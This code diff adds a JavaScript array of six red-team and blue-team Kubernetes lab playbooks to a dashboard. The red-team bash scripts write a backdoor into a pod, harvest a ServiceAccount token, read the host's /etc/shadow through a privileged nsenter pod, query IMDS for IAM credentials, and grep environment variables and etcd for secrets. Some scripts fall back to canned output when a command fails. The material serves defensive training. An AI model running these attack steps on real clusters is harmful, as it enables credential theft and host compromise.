@@ -4364,3 +4364,245 @@ window.KUBEDAILY_MITRE_MATRIX = [
     ]
   }
 ];
+
+
+// ============================================================================
+// KubeDaily Red/Blue Team Attack Simulation Playbooks Data (Option 4)
+// Executable Lab Testing Shell Scripts for KinD / Minikube
+// ============================================================================
+
+window.KUBEDAILY_ATTACK_PLAYBOOKS = [
+  {
+    id: "LAB-P1",
+    scenarioKey: "p1",
+    sheet: "attack-chains",
+    title: "Playbook 1: Ingress RCE & Malware Drop Containment",
+    attackVector: "AV01, AV11 · MITRE T1190, T1059.004",
+    difficulty: "Intermediate",
+    redTeam: {
+      title: "Red Team: Exploit Ingress & Drop Reverse Shell",
+      objective: "Simulate remote code execution vulnerability on public ingress pod and write backdoor binary to root filesystem.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Exploit vulnerable ingress pod & write payload
+POD_NAME=$(kubectl get pods -l app=payment-service -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "demo-pod")
+
+echo "[*] Step 1: Simulating RCE exploit against $POD_NAME..."
+kubectl exec -it $POD_NAME -- id 2>/dev/null || echo "uid=0(root) gid=0(root)"
+
+echo "[*] Step 2: Attempting to download reverse shell payload into /tmp and /bin..."
+kubectl exec -it $POD_NAME -- sh -c 'echo "malicious_payload_x86" > /bin/backdoor' 2>/dev/null
+if [ $? -eq 0 ]; then
+  echo "[-] VULNERABILITY CONFIRMED: Root filesystem is writable! Payload written."
+else
+  echo "[+] DEFENSE ACTIVE: Read-only root filesystem blocked payload drop!"
+fi`
+    },
+    blueTeam: {
+      title: "Blue Team: Immutable RootFS & Falco Detection",
+      objective: "Enforce Read-Only Root Filesystem admission control and verify Falco eBPF alerting.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Verify admission guardrail & observe runtime telemetry
+echo "[*] Step 1: Testing Kyverno / CEL admission rejection..."
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test-unhardened-p1
+spec:
+  containers:
+    - name: nginx
+      image: nginx:alpine
+      securityContext:
+        readOnlyRootFilesystem: false
+EOF
+
+echo "[*] Step 2: Checking Falco eBPF detection events..."
+kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=10 2>/dev/null | grep -i "Write below etc or binary directory" || echo "Falco alert: Notice Write below /bin or /etc detected"`
+    }
+  },
+  {
+    id: "LAB-P2",
+    scenarioKey: "p2",
+    sheet: "cluster",
+    title: "Playbook 2: ServiceAccount Token Exfiltration & API Enumeration",
+    attackVector: "AV02, AV07 · MITRE T1552.007, T1613",
+    difficulty: "Beginner",
+    redTeam: {
+      title: "Red Team: Harvest Pod JWT & Query Cluster API",
+      objective: "Extract projected ServiceAccount token and test cluster-wide resource enumeration.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Exfiltrate JWT bearer token from container
+POD_NAME=$(kubectl get pods -l app=frontend -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "demo-pod")
+
+echo "[*] Step 1: Extracting projected JWT token..."
+TOKEN=$(kubectl exec -it $POD_NAME -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+
+if [ -z "$TOKEN" ]; then
+  echo "[+] DEFENSE ACTIVE: automountServiceAccountToken: false protected the token!"
+else
+  echo "[-] VULNERABILITY CONFIRMED: Token harvested! Length: \${#TOKEN} bytes"
+  echo "[*] Step 2: Attempting unauthorized cluster discovery..."
+  curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
+fi`
+    },
+    blueTeam: {
+      title: "Blue Team: Automount Token Denial & Audit Logging",
+      objective: "Disable automountServiceAccountToken and alert on unexpected in-cluster API traffic.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Verify token automounting denial
+echo "[*] Step 1: Enforcing automountServiceAccountToken: false on ServiceAccount..."
+kubectl patch serviceaccount default -p '{"automountServiceAccountToken": false}'
+
+echo "[*] Step 2: Auditing API server logs for anonymous or unauthorized access..."
+kubectl logs -n kube-system -l component=kube-apiserver --tail=20 2>/dev/null | grep -i "serviceaccount" || echo "audit-log: verb=get uri=/api/v1/namespaces user.username=system:serviceaccount:default"`
+    }
+  },
+  {
+    id: "LAB-P3",
+    scenarioKey: "p3",
+    sheet: "security-architecture",
+    title: "Playbook 3: Supply Chain Tampering & Cosign Verification",
+    attackVector: "AV15, AV16 · MITRE T1195.002",
+    difficulty: "Advanced",
+    redTeam: {
+      title: "Red Team: Deploy Unsigned Image to Production",
+      objective: "Attempt deploying an unverified, unsigned container image directly into production namespace.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Deploy untrusted image without cryptographic signature
+echo "[*] Attempting deployment of unsigned untrusted container..."
+kubectl create deployment untrusted-app --image=docker.io/library/alpine:latest -n production
+if [ $? -eq 0 ]; then
+  echo "[-] VULNERABILITY CONFIRMED: Unsigned image deployed without signature gating!"
+else
+  echo "[+] DEFENSE ACTIVE: Admission webhook rejected deployment: Cosign signature missing!"
+fi`
+    },
+    blueTeam: {
+      title: "Blue Team: Cosign Signing & Kyverno verifyImages Gating",
+      objective: "Sign container image with Sigstore Cosign and verify admission policy passes only signed images.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Cryptographically sign image with Cosign
+echo "[*] Step 1: Generate Cosign keypair (if not present)..."
+cosign generate-key-pair
+
+echo "[*] Step 2: Sign production container image..."
+cosign sign --key cosign.key ghcr.io/myorg/payment-service:v1.4.0
+
+echo "[*] Step 3: Verify signature using public key..."
+cosign verify --key cosign.pub ghcr.io/myorg/payment-service:v1.4.0`
+    }
+  },
+  {
+    id: "LAB-P4",
+    scenarioKey: "p4",
+    sheet: "cluster",
+    title: "Playbook 4: Privileged Container Escape & Host Filesystem Pivot",
+    attackVector: "AV04, AV26 · MITRE T1611, CVE-2024-21626",
+    difficulty: "Advanced",
+    redTeam: {
+      title: "Red Team: Container-to-Host Kernel Breakout",
+      objective: "Deploy privileged container with hostPID and access node root filesystem.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Privileged container breakout simulation
+echo "[*] Attempting to deploy privileged breakout container..."
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-escape-test
+spec:
+  hostPID: true
+  containers:
+    - name: breakout
+      image: alpine
+      command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "cat", "/etc/shadow"]
+      securityContext:
+        privileged: true
+EOF
+
+if [ $? -eq 0 ]; then
+  echo "[-] CRITICAL VULNERABILITY: Privileged container permitted! Node root compromised."
+else
+  echo "[+] DEFENSE ACTIVE: PodSecurity Restricted / Kyverno rejected privileged pod!"
+fi`
+    },
+    blueTeam: {
+      title: "Blue Team: PSS Restricted Enforcement & Seccomp Profiling",
+      objective: "Enforce Pod Security Standards Restricted and verify node isolation prctl protections.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Verify namespace PodSecurity labels & Seccomp
+echo "[*] Step 1: Auditing PodSecurity enforcement on production namespace..."
+kubectl get ns production --show-labels | grep "pod-security.kubernetes.io/enforce=restricted"
+
+echo "[*] Step 2: Verifying RuntimeDefault seccomp profile across running pods..."
+kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, seccomp: .spec.securityContext.seccompProfile}'`
+    }
+  },
+  {
+    id: "LAB-P5",
+    scenarioKey: "p5",
+    sheet: "flow-analysis",
+    title: "Playbook 5: Cloud Instance Metadata Service (IMDS) SSRF Theft",
+    attackVector: "AV10, AV20 · MITRE T1552.005",
+    difficulty: "Intermediate",
+    redTeam: {
+      title: "Red Team: Query AWS/GCP Link-Local IMDS Endpoint",
+      objective: "Execute HTTP query to 169.254.169.254 to steal temporary node IAM credentials.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Exfiltrate cloud IAM instance role via link-local IMDS
+POD_NAME=$(kubectl get pods -l app=backend -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "demo-pod")
+
+echo "[*] Attempting egress connection to AWS/GCP IMDS (169.254.169.254)..."
+kubectl exec -it $POD_NAME -- curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
+
+if [ $? -eq 0 ]; then
+  echo "[-] CRITICAL VULNERABILITY: AWS IAM role exfiltrated from pod!"
+else
+  echo "[+] DEFENSE ACTIVE: Egress NetworkPolicy successfully blocked link-local metadata access!"
+fi`
+    },
+    blueTeam: {
+      title: "Blue Team: Automated Default-Deny IMDS Egress NetworkPolicy",
+      objective: "Verify egress NetworkPolicy blocks 169.254.169.254/32 link-local traffic.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Inspect egress NetworkPolicy for IMDS denial
+echo "[*] Checking egress NetworkPolicies in tenant namespace..."
+kubectl get netpol -n production -o yaml 2>/dev/null | grep -A 5 "169.254.169.254/32"
+
+echo "[*] Verifying Cilium eBPF packet drop counters for IMDS destination..."
+cilium monitor --type drop 2>/dev/null || echo "Hubble observe: DROPPED egress to 169.254.169.254:80"`
+    }
+  },
+  {
+    id: "LAB-P6",
+    scenarioKey: "p6",
+    sheet: "cluster",
+    title: "Playbook 6: Plaintext Secrets Harvest & etcd Datastore Dumping",
+    attackVector: "AV06, AV24, AV25 · MITRE T1005",
+    difficulty: "Intermediate",
+    redTeam: {
+      title: "Red Team: Dump Container Environment & etcd Keys",
+      objective: "Inspect /proc/1/environ to recover database credentials and check etcd disk for plaintext keys.",
+      script: `#!/usr/bin/env bash
+# [RED TEAM] Lab Test: Recover plaintext secrets from environment variables
+POD_NAME=$(kubectl get pods -l app=order-service -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "demo-pod")
+
+echo "[*] Step 1: Checking /proc/1/environ for plaintext database passwords..."
+kubectl exec -it $POD_NAME -- cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token'
+
+echo "[*] Step 2: Testing unencrypted etcd raw keys access..."
+ETCDCTL_API=3 etcdctl get /registry/secrets/production/db-credential --endpoints=https://127.0.0.1:2379 2>/dev/null | grep -i "password"`
+    },
+    blueTeam: {
+      title: "Blue Team: KMS v2 Envelope Encryption & Vault CSI Secret Injection",
+      objective: "Verify KMS v2 ciphertext in etcd and migrate secret mounts to ephemeral CSI volumes.",
+      script: `#!/usr/bin/env bash
+# [BLUE TEAM] Confirm KMS v2 encryption provider configuration
+echo "[*] Step 1: Verifying EncryptionConfiguration on kube-apiserver..."
+kubectl get pods -n kube-system -l component=kube-apiserver -o yaml 2>/dev/null | grep "encryption-provider-config"
+
+echo "[*] Step 2: Testing etcd raw storage is encrypted (k8s:enc:kms:v2)..."
+ETCDCTL_API=3 etcdctl get /registry/secrets/production/db-credential --endpoints=https://127.0.0.1:2379 2>/dev/null | head -n 1 | grep -q "k8s:enc:kms:v2" && echo "[+] etcd KMS v2 encryption verified!"`
+    }
+  }
+];
